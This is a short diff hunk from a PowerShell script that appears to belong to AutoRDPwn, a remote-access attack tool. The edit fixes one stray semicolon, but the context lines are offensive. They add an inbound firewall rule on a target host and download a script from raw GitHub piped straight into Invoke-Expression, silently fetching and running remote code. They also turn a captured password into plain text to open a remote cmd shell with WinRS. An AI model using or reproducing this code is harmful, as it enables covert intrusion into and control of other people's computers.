@@ -442,7 +442,7 @@ if ($webserver){ invoke-command -session $RDP[0] -scriptblock { netsh advfirewal
 netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host ""
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
 Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue 
-Write-Host "----------------------------------------------------------------------" ; -ForegroundColor Gray ; sleep -milliseconds 4000
+Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; sleep -milliseconds 4000
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex 2>&1> $null }}
 
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt29 <<" ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
